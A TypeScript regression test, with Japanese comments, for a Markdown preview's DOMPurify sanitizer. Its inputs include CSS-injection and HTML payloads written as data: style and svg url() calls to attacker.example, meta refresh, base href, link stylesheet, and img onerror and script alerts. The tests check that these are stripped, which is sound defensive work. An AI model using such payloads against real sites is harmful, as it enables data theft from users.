import { beforeAll, describe, expect, test } from "bun:test";
import createDOMPurify from "dompurify";
import { JSDOM } from "jsdom";
import { SANITIZE_CONFIG } from "../public/sanitize-config.js";

/**
 * Issue #59: プレビューのサニタイザ (public/app.js の sanitize()) が実際に
 * `<style>` タグと style 属性を除去し、CSS インジェクション (exfiltration) を防ぐことを
 * 行動検証する。ブラウザ非依存で回帰を検知できるよう jsdom + DOMPurify で再現する。
 * jsdom は `<style>` を CSSOM として扱い、実ブラウザの DOMPurify と同じく中身ごと除去する
 * (happy-dom は中身をテキストとして残すため不適)。app.js と同じ SANITIZE_CONFIG
 * (public/sanitize-config.js) を共有しているため、設定が緩められればこのテストが落ちる。
 */
let sanitize: (html: string) => string;

beforeAll(() => {
  const { window } = new JSDOM("");
  // DOMPurify は window を受け取るファクトリ。jsdom の window を渡して初期化する。
  const purify = createDOMPurify(window as unknown as Window & typeof globalThis);
  sanitize = (html: string) => purify.sanitize(html, SANITIZE_CONFIG);
});

describe("sanitize() の実挙動 (Issue #59)", () => {
  test("悪意ある <style> タグを中身ごと除去する (CSS 注入を遮断)", () => {
    const out = sanitize(
      "<p>ok</p><style>.probe{background:url(https://attacker.example/leak)}</style>",
    );
    expect(out).toContain("ok");
    expect(out.toLowerCase()).not.toContain("<style");
    expect(out).not.toContain("attacker.example");
    expect(out).not.toContain(".probe");
  });

  test("inline style 属性を除去する (外部 url() による exfiltration を遮断)", () => {
    const out = sanitize('<p style="background:url(https://attacker.example/attr)">text</p>');
    expect(out).toContain("text");
    expect(out).not.toContain("style=");
    expect(out).not.toContain("attacker.example");
  });

  test("table の align 属性は維持する (marked の GFM 配置を壊さない)", () => {
    const out = sanitize(
      '<table><tr><th align="center">C</th><td align="right">x</td></tr></table>',
    );
    expect(out).toContain('align="center"');
    expect(out).toContain('align="right"');
  });

  test("リンクの target / rel は維持する (別タブ遷移を壊さない)", () => {
    const out = sanitize('<a href="https://example.com" target="_blank" rel="noopener">x</a>');
    expect(out).toContain('target="_blank"');
    expect(out).toContain("noopener");
  });

  test("Issue #64: リンクの download 属性は維持する (csv 等のダウンロードを壊さない)", () => {
    const out = sanitize('<a href="/api/asset?path=sales.csv" target="_blank" download>x</a>');
    expect(out).toContain("download");
    expect(out).toContain('target="_blank"');
  });

  test("コードブロック (class ベース) は維持する", () => {
    const out = sanitize('<pre><code class="language-js">const x = 1;</code></pre>');
    expect(out).toContain('class="language-js"');
    expect(out).toContain("const x = 1;");
  });

  test("<script> と inline event handler は従来どおり除去する (回帰防止)", () => {
    const out = sanitize('<img src=x onerror="alert(1)"><script>alert(2)</script><p>safe</p>');
    expect(out).toContain("safe");
    expect(out.toLowerCase()).not.toContain("<script");
    expect(out).not.toContain("onerror");
    expect(out).not.toContain("alert(2)");
  });

  test('Mermaid の <pre class="mermaid"> は保持する (図の描画元テキスト)', () => {
    const out = sanitize('<pre class="mermaid">graph LR\n  A--&gt;B</pre>');
    expect(out).toContain('class="mermaid"');
    expect(out).toContain("graph LR");
  });

  test("他の CSS/情報送信経路も除去する (link/meta/base/svg image, 前方防御)", () => {
    // 現状 USE_PROFILES:{html:true} により許可リスト外だが、将来 svg:true 等で
    // 経路が再開しないよう明示的に回帰アサーションを置く (Claude review 提案)。
    const vectors = [
      '<link rel="stylesheet" href="https://attacker.example/x.css">',
      '<meta http-equiv="refresh" content="0;url=https://attacker.example/">',
      '<base href="https://attacker.example/">',
      '<svg><image href="https://attacker.example/leak"></image></svg>',
      "<svg><style>.x{background:url(https://attacker.example/leak)}</style></svg>",
    ];
    for (const v of vectors) {
      expect(sanitize(v)).not.toContain("attacker.example");
    }
  });
});
